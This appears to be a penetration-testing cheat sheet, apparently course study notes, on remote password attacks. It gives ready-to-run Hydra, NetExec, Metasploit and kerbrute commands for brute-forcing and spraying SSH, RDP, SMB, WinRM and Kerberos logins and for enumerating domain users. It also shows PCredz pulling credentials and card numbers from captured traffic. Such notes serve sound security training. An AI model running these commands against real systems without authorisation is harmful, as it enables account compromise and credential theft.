# Remote Password Attacks

## Network Services and Credential Hunting

**Winrm**
````
$ netexec winrm <IP> -u user.list -p password.list
````

**Hydra: ssh, smb, rdp**
````
$ hydra -L user.list -P password.list ssh://<IP>
$ hydra -L user.list -P password.list rdp://<IP>
$ hydra -L user.list -P password.list smb://<IP>
$ hydra -l username -P password.list <service>://<ip>
------------------------------------------------
- Metasploit SMB -
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
msf6 auxiliary(scanner/smb/smb_login) > set rhosts <IP>
````

**Password Spraying**
````
$ netexec smb <IP>/24 -u <usernames.list> -p 'ChangeMe123!'
$ kerbrute passwordspray -d test.local domain_users.txt password123
````

**Enumerate Valid Users**
````
$ ./kerbrute_linux_amd64 userenum --dc <IP> --domain <domain> <list_of_users>
````

**Credential Stuffing**

https://github.com/ihebski/DefaultCreds-cheat-sheet
````
$ creds search linksys
$ creds search tomcat
$ creds search <service>
````

**Network Traffic**

Pcredz is a tool that can be used to extract credentials from live traffic or network packet captures. Specifically, it supports extracting the following information:

Credit card numbers
POP credentials
SMTP credentials
IMAP credentials
SNMP community strings
FTP credentials
Credentials from HTTP NTLM/Basic headers, as well as HTTP Forms
NTLMv1/v2 hashes from various traffic including DCE-RPC, SMBv1/2, LDAP, MSSQL, and HTTP
Kerberos (AS-REQ Pre-Auth etype 23) hashes
````
https://github.com/lgandx/PCredz
$ ./Pcredz -f demo.pcapng -t -v
````



